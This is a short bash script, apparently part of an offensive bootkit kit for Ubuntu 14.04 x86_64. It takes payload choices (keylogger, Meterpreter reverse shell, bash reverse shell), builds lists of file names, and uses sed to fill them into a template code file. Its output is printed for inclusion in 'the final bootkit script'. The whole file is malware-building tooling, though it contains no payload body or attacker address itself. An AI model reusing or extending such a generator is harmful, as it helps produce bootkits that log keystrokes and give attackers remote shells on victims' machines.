#!/bin/bash

#some config variables, e.g. file names
source kit/config_common.sh

#based upon chosen payloads, basic code build may slightly differ
PAYLOAD_KEYLOGGER=0
PAYLOAD_REV_SHELL_METERPRETER=0
PAYLOAD_REV_SHELL=0
while test $# -gt 0
do
  case "$1" in
   "0")
     PAYLOAD_KEYLOGGER=1
     ;;
   "1")
     PAYLOAD_REV_SHELL_METERPRETER=1
     ;;
   "2")
     PAYLOAD_REV_SHELL=1
     ;;   
  esac
  shift
done

files=("\"\/umount\"" "\"\/mkdir\"" "\"\/cat\"" "\"\/tee\"" "\"\/chmod\"" "\"\/cp\"" "\"\/touch\"" "\"\/grep\"" "\"\/cut\"" "\"\/mktemp\"" "\"\/head\"" "\"\/tail\"")
payloadfiles=( )
if [ $PAYLOAD_KEYLOGGER -gt 0 ]; then
  payloadfiles+=("\"\/$KEYLOGGER\"")
fi
if [ $PAYLOAD_REV_SHELL_METERPRETER -gt 0 ]; then
  payloadfiles+=("\"\/$MSF_PAYLOAD\"")
  payloadfiles+=("\"\/$MSF_PAYLOAD_SHELL\"")
fi
if [ $PAYLOAD_REV_SHELL -gt 0 ]; then
  payloadfiles+=("\"\/$BASH_PAYLOAD_SHELL\"")
fi

code=`cat kit/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_code.sh`
filelist=`echo "${files[@]}"`
payloadfilelist=`echo "${payloadfiles[@]}"`
sedexpr="s/FILELIST/$filelist/g"
newcode=`echo "$code" | sed "$sedexpr"`
sedexpr="s/FILEPAYLOADLIST/$payloadfilelist/g"
newcode=`echo "$newcode" | sed "$sedexpr"`

#the output will be included in the final bootkit script
echo "$newcode"
